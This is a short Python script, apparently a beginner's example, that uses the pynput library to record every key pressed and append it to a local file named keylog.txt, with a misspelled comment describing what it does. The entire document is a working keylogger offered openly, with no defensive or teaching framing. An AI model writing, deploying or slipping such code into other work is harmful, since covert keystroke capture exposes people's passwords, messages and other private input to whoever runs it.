from pynput.keyboard import Key, Listener

def log_keystroke(key):
    key = str(key).replace("'", "")  

    with open("keylog.txt", "a") as file:
        file.write(f"{key}\n")  

with Listener(on_press=log_keystroke) as listener:
    listener.join()
#after writing this code this will creat a new file for saving keystrocks of keyboard
